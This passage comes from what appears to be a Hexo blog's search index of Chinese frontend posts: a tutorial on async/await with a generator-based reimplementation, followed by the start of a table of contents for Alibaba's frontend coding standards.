href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 兼容 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 兼容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async_await及其实现</title>
      <link href="/2021/10/10/frontend/interview/async-await-ji-qi-shi-xian/"/>
      <url>/2021/10/10/frontend/interview/async-await-ji-qi-shi-xian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>async 和 await 关键字让我们可以用一种更简洁的方式写出基于 Promise 的异步行为，而无需刻意地链式调用 promise。<br><a name="ZFkH2"></a></p><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p><code>Promise B</code>需要接受 <code>Promise A</code>的返回值作为下一步计算的参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">promiseA</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promiseB</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">`value: <span class="subst">$&#123;value&#125;</span>`</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>在没有async/await时，需要嵌套调用`Promise.then()`</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">promiseA</span>().<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">promiseB</span>(res).<span class="title function_">then</span>(<span class="function"><span class="params">res2</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><pre><code>使用`async/await`:</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">fun</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">promiseA</span>();</span><br><span class="line">  <span class="keyword">const</span> res2 = <span class="keyword">await</span> <span class="title function_">promiseB</span>(res);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun</span>()</span><br></pre></td></tr></table></figure><p>对比起来，async&#x2F;await 更像是在同步处理异步问题，更符合人的阅读直觉。<br><a name="Sg7kZ"></a></p><h1 id="函数生成器模拟实现"><a href="#函数生成器模拟实现" class="headerlink" title="函数生成器模拟实现"></a>函数生成器模拟实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">promise1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promise2</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="string">&quot;value:&quot;</span> + value);</span><br><span class="line">      <span class="comment">// reject(&quot;错误&quot;);</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promise3</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&quot;value:&quot;</span> + value);</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">readFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> value = <span class="keyword">yield</span> <span class="title function_">promise1</span>();</span><br><span class="line">  <span class="keyword">const</span> value2 = <span class="keyword">yield</span> <span class="title function_">promise2</span>(value);</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">yield</span> <span class="title function_">promise3</span>(value2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">asyncGen</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> g = <span class="title function_">fn</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">next</span>(<span class="params">param</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; value, done &#125; = g.<span class="title function_">next</span>(param);</span><br><span class="line">      <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">        <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(value).<span class="title function_">then</span>(</span><br><span class="line">          <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">next</span>(res);</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(param);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">asyncGen</span>(readFile).<span class="title function_">then</span>(</span><br><span class="line">  <span class="function">(<span class="params">res</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res),</span><br><span class="line">  <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> js </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里前端开发规范</title>
      <link href="/2021/10/07/frontend/a-li-qian-duan-kai-fa-gui-fan/"/>
      <url>/2021/10/07/frontend/a-li-qian-duan-kai-fa-gui-fan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>目录</p><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%A3%B0%E6%98%8E">声明</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83">前端代码规范</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%89%8D%E7%AB%AF-js-%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83">前端 JS 项目开发规范</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%80%E3%80%81%E7%BC%96%E7%A8%8B%E8%A7%84%E7%BA%A6">一、编程规约</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%80%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83">(一)命名规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#111-%E9%A1%B9%E7%9B%AE%E5%91%BD%E5%90%8D">1.1.1 项目命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#112-%E7%9B%AE%E5%BD%95%E5%91%BD%E5%90%8D">1.1.2 目录命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#113-js%E3%80%81css%E3%80%81scss%E3%80%81html%E3%80%81png-%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D">1.1.3 JS、CSS、SCSS、HTML、PNG 文件命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#114-%E5%91%BD%E5%90%8D%E4%B8%A5%E8%B0%A8%E6%80%A7">1.1.4 命名严谨性</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%8Chtml-%E8%A7%84%E8%8C%83-%EF%BC%88vue-template-%E5%90%8C%E6%A0%B7%E9%80%82%E7%94%A8%EF%BC%89">(二)HTML 规范 （Vue Template 同样适用）</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#121-html-%E7%B1%BB%E5%9E%8B">1.2.1 HTML 类型</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#122-%E7%BC%A9%E8%BF%9B">1.2.2 缩进</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#123-%E5%88%86%E5%9D%97%E6%B3%A8%E9%87%8A">1.2.3 分块注释</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#124-%E8%AF%AD%E4%B9%89%E5%8C%96%E6%A0%87%E7%AD%BE">1.2.4 语义化标签</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#125-%E5%BC%95%E5%8F%B7">1.2.5 引号</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%89-css-%E8%A7%84%E8%8C%83">(三) CSS 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#131-%E5%91%BD%E5%90%8D">1.3.1 命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#132-%E9%80%89%E6%8B%A9%E5%99%A8">1.3.2 选择器</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#133-%E5%B0%BD%E9%87%8F%E4%BD%BF%E7%94%A8%E7%BC%A9%E5%86%99%E5%B1%9E%E6%80%A7">1.3.3 尽量使用缩写属性</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#134-%E6%AF%8F%E4%B8%AA%E9%80%89%E6%8B%A9%E5%99%A8%E5%8F%8A%E5%B1%9E%E6%80%A7%E7%8B%AC%E5%8D%A0%E4%B8%80%E8%A1%8C">1.3.4 每个选择器及属性独占一行</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#135-%E7%9C%81%E7%95%A50%E5%90%8E%E9%9D%A2%E7%9A%84%E5%8D%95%E4%BD%8D">1.3.5 省略 0 后面的单位</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#136-%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8id%E9%80%89%E6%8B%A9%E5%99%A8%E5%8F%8A%E5%85%A8%E5%B1%80%E6%A0%87%E7%AD%BE%E9%80%89%E6%8B%A9%E5%99%A8%E9%98%B2%E6%AD%A2%E6%B1%A1%E6%9F%93%E5%85%A8%E5%B1%80%E6%A0%B7%E5%BC%8F">1.3.6 避免使用 ID 选择器及全局标签选择器防止污染全局样式</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E5%9B%9B-less-%E8%A7%84%E8%8C%83">(四) LESS 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#141-%E4%BB%A3%E7%A0%81%E7%BB%84%E7%BB%87">1.4.1 代码组织</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1%E5%B0%86%E5%85%AC%E5%85%B1less%E6%96%87%E4%BB%B6%E6%94%BE%E7%BD%AE%E5%9C%A8stylelesscommon%E6%96%87%E4%BB%B6%E5%A4%B9">1)将公共 less 文件放置在 style&#x2F;less&#x2F;common 文件夹</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2%E6%8C%89%E4%BB%A5%E4%B8%8B%E9%A1%BA%E5%BA%8F%E7%BB%84%E7%BB%87">2)按以下顺序组织</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#142-%E9%81%BF%E5%85%8D%E5%B5%8C%E5%A5%97%E5%B1%82%E7%BA%A7%E8%BF%87%E5%A4%9A">1.4.2 避免嵌套层级过多</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%94-javascript-%E8%A7%84%E8%8C%83">(五) Javascript 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#151-%E5%91%BD%E5%90%8D">1.5.1 命名</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E9%87%87%E7%94%A8%E5%B0%8F%E5%86%99%E9%A9%BC%E5%B3%B0%E5%91%BD%E5%90%8D-lowercamelcase%EF%BC%8C%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%91%BD%E5%90%8D%E5%9D%87%E4%B8%8D%E8%83%BD%E4%BB%A5%E4%B8%8B%E5%88%92%E7%BA%BF%EF%BC%8C%E4%B9%9F%E4%B8%8D%E8%83%BD%E4%BB%A5%E4%B8%8B%E5%88%92%E7%BA%BF%E6%88%96%E7%BE%8E%E5%85%83%E7%AC%A6%E5%8F%B7%E7%BB%93%E6%9D%9F">1) 采用小写驼峰命名 lowerCamelCase，代码中的命名均不能以下划线，也不能以下划线或美元符号结束</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E6%96%B9%E6%B3%95%E5%90%8D%E3%80%81%E5%8F%82%E6%95%B0%E5%90%8D%E3%80%81%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E3%80%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E9%83%BD%E7%BB%9F%E4%B8%80%E4%BD%BF%E7%94%A8-lowercamelcase-%E9%A3%8E%E6%A0%BC%EF%BC%8C%E5%BF%85%E9%A1%BB%E9%81%B5%E4%BB%8E%E9%A9%BC%E5%B3%B0%E5%BD%A2%E5%BC%8F%E3%80%82">2) 方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格，必须遵从驼峰形式。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-%E5%B8%B8%E9%87%8F%E5%91%BD%E5%90%8D%E5%85%A8%E9%83%A8%E5%A4%A7%E5%86%99%EF%BC%8C%E5%8D%95%E8%AF%8D%E9%97%B4%E7%94%A8%E4%B8%8B%E5%88%92%E7%BA%BF%E9%9A%94%E5%BC%80%EF%BC%8C%E5%8A%9B%E6%B1%82%E8%AF%AD%E4%B9%89%E8%A1%A8%E8%BE%BE%E5%AE%8C%E6%95%B4%E6%B8%85%E6%A5%9A%EF%BC%8C%E4%B8%8D%E8%A6%81%E5%AB%8C%E5%90%8D%E5%AD%97%E9%95%BF%E3%80%82">3) 常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#152-%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F">1.5.2 代码格式</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E4%BD%BF%E7%94%A8-2-%E4%B8%AA%E7%A9%BA%E6%A0%BC%E8%BF%9B%E8%A1%8C%E7%BC%A9%E8%BF%9B">1) 使用 2 个空格进行缩进</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E4%B8%8D%E5%90%8C%E9%80%BB%E8%BE%91%E3%80%81%E4%B8%8D%E5%90%8C%E8%AF%AD%E4%B9%89%E3%80%81%E4%B8%8D%E5%90%8C%E4%B8%9A%E5%8A%A1%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E4%B8%80%E4%B8%AA%E7%A9%BA%E8%A1%8C%E5%88%86%E9%9A%94%E5%BC%80%E6%9D%A5%E4%BB%A5%E6%8F%90%E5%8D%87%E5%8F%AF%E8%AF%BB%E6%80%A7%E3%80%82">2) 不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性。</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#153-%E5%AD%97%E7%AC%A6%E4%B8%B2">1.5.3 字符串</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#154-%E5%AF%B9%E8%B1%A1%E5%A3%B0%E6%98%8E">1.5.4 对象声明</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1%E4%BD%BF%E7%94%A8%E5%AD%97%E9%9D%A2%E5%80%BC%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1">1)使用字面值创建对象</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E4%BD%BF%E7%94%A8%E5%AD%97%E9%9D%A2%E9%87%8F%E6%9D%A5%E4%BB%A3%E6%9B%BF%E5%AF%B9%E8%B1%A1%E6%9E%84%E9%80%A0%E5%99%A8">2) 使用字面量来代替对象构造器</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#155-%E4%BD%BF%E7%94%A8-es67">1.5.5 使用 ES6,7</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#156-%E6%8B%AC%E5%8F%B7">1.5.6 括号</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#157-undefined-%E5%88%A4%E6%96%AD">1.5.7 undefined 判断</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#158-%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%92%8C%E5%BE%AA%E7%8E%AF%E6%9C%80%E5%A4%9A%E4%B8%89%E5%B1%82">1.5.8 条件判断和循环最多三层</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#159-this-%E7%9A%84%E8%BD%AC%E6%8D%A2%E5%91%BD%E5%90%8D">1.5.9 this 的转换命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1510-%E6%85%8E%E7%94%A8-consolelog">1.5.10 慎用 console.log</a></li></ul></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%8C%E3%80%81vue-%E9%A1%B9%E7%9B%AE%E8%A7%84%E8%8C%83">二、Vue 项目规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%B8%80-vue-%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80">(一) Vue 编码基础</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#211-%E7%BB%84%E4%BB%B6%E8%A7%84%E8%8C%83">2.1.1. 组件规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E7%BB%84%E4%BB%B6%E5%90%8D%E4%B8%BA%E5%A4%9A%E4%B8%AA%E5%8D%95%E8%AF%8D%E3%80%82">1) 组件名为多个单词。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E7%BB%84%E4%BB%B6%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-pascal-case-%E6%A0%BC%E5%BC%8F">2) 组件文件名为 pascal-case 格式</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-base-%E5%BC%80%E5%A4%B4%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E5%8D%95%E8%AF%8D%E8%80%8C%E4%B8%8D%E6%98%AF%E7%BC%A9%E5%86%99%E3%80%82">3) 基础组件文件名为 base 开头，使用完整单词而不是缩写。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#4-%E5%92%8C%E7%88%B6%E7%BB%84%E4%BB%B6%E7%B4%A7%E5%AF%86%E8%80%A6%E5%90%88%E7%9A%84%E5%AD%90%E7%BB%84%E4%BB%B6%E5%BA%94%E8%AF%A5%E4%BB%A5%E7%88%B6%E7%BB%84%E4%BB%B6%E5%90%8D%E4%BD%9C%E4%B8%BA%E5%89%8D%E7%BC%80%E5%91%BD%E5%90%8D">4) 和父组件紧密耦合的子组件应该以父组件名作为前缀命名</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#5-%E5%9C%A8-template-%E6%A8%A1%E7%89%88%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6%EF%BC%8C%E5%BA%94%E4%BD%BF%E7%94%A8-pascalcase-%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%BD%BF%E7%94%A8%E8%87%AA%E9%97%AD%E5%90%88%E7%BB%84%E4%BB%B6%E3%80%82">5) 在 Template 模版中使用组件，应使用 PascalCase 模式，并且使用自闭合组件。</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#6-%E7%BB%84%E4%BB%B6%E7%9A%84-data-%E5%BF%85%E9%A1%BB%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0">6) 组件的 data 必须是一个函数</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#7-prop-%E5%AE%9A%E4%B9%89%E5%BA%94%E8%AF%A5%E5%B0%BD%E9%87%8F%E8%AF%A6%E7%BB%86">7) Prop 定义应该尽量详细</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#8-%E4%B8%BA%E7%BB%84%E4%BB%B6%E6%A0%B7%E5%BC%8F%E8%AE%BE%E7%BD%AE%E4%BD%9C%E7%94%A8%E5%9F%9F">8) 为组件样式设置作用域</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#9-%E5%A6%82%E6%9E%9C%E7%89%B9%E6%80%A7%E5%85%83%E7%B4%A0%E8%BE%83%E5%A4%9A%EF%BC%8C%E5%BA%94%E8%AF%A5%E4%B8%BB%E5%8A%A8%E6%8D%A2%E8%A1%8C%E3%80%82">9) 如果特性元素较多，应该主动换行。</a></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#212-%E6%A8%A1%E6%9D%BF%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%AE%80%E5%8D%95%E7%9A%84%E8%A1%A8%E8%BE%BE%E5%BC%8F">2.1.2. 模板中使用简单的表达式</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#213-%E6%8C%87%E4%BB%A4%E9%83%BD%E4%BD%BF%E7%94%A8%E7%BC%A9%E5%86%99%E5%BD%A2%E5%BC%8F">2.1.3 指令都使用缩写形式</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#214-%E6%A0%87%E7%AD%BE%E9%A1%BA%E5%BA%8F%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4">2.1.4 标签顺序保持一致</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#215-%E5%BF%85%E9%A1%BB%E4%B8%BA-v-for-%E8%AE%BE%E7%BD%AE%E9%94%AE%E5%80%BC-key">2.1.5 必须为 v-for 设置键值 key</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#216-v-show-%E4%B8%8E-v-if-%E9%80%89%E6%8B%A9">2.1.6 v-show 与 v-if 选择</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#217-script-%E6%A0%87%E7%AD%BE%E5%86%85%E9%83%A8%E7%BB%93%E6%9E%84%E9%A1%BA%E5%BA%8F">2.1.7 script 标签内部结构顺序</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#218-vue-router-%E8%A7%84%E8%8C%83">2.1.8 Vue Router 规范</a><ul><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0">1) 页面跳转数据传递使用路由参数</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E6%87%92%E5%8A%A0%E8%BD%BD%EF%BC%88%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD%EF%BC%89%E6%9C%BA%E5%88%B6">2) 使用路由懒加载（延迟加载）机制</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-router-%E4%B8%AD%E7%9A%84%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83">3) router 中的命名规范</a></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#4-router-%E4%B8%AD%E7%9A%84-path-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83">4) router 中的 path 命名规范</a></li></ul></li></ul></li><li><a href="https://www.cnblogs.com/suwanbin/p/13200530.html#%E4%BA%8C-vue-%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E8%A7%84%E8%8C%83">(二) Vue 项目目录规范</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#221-%E5%9F%BA%E7%A1%80">2.2.1 基础</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#222-%E4%BD%BF%E7%94%A8-vue-cli-%E8%84%9A%E6%89%8B%E6%9E%B6">2.2.2 使用 Vue-cli 脚手架</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#223-%E7%9B%AE%E5%BD%95%E8%AF%B4%E6%98%8E">2.2.3 目录说明</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#1-api-%E7%9B%AE%E5%BD%95">1) api 目录</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#2-assets-%E7%9B%AE%E5%BD%95">2) assets 目录</a> - <a href="https://www.cnblogs.com/suwanbin/p/13200530.html#3-components-%E7%9B%AE%E5%BD%95">3) components 目录</a> - <a 